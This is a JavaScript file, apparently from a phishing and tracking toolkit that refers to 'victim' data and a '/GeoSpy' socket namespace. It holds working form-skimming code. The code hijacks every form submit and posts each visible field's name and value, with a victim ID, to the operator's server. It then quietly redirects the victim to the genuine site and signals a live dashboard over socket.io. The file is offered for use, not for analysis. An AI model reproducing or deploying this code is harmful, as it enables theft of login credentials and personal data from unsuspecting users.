// MIT License
//
// Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

$(document).ready(function($) {

    $(document).delegate('form', 'submit', function(event) {
        event.preventDefault();

        var d = getVictimData();

        objs = $(this).find('input:visible');
        var sId = Math.random().toString(36).substr(2);
        
        $.each(objs, function(index, val) {
            var datav = {
                vId : d.vId,
                site : d.vURL,
                sId : sId,
                fid : ($(val).attr('id') || ''),
                name : ($(val).attr('name') || ''),
                value : ($(val).val() || '')
            };

            $.ajax({
                url: "/regv",
                data: datav,
                dataType: "json",
                type: "POST",
                success: function(response) {
                    socket.emit('my_broadcast_event', {data: 'update-data'});
                },
                error: function(error) {
                }
            });
        });

        window.location.replace(d.vURL);
    });

    if (typeof(io) != 'undefined') {
        var d = getVictimData();
        namespace = '/GeoSpy';
        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
        socket.emit('join', {room: d.vId});
        defineSockets(socket);
    }
});
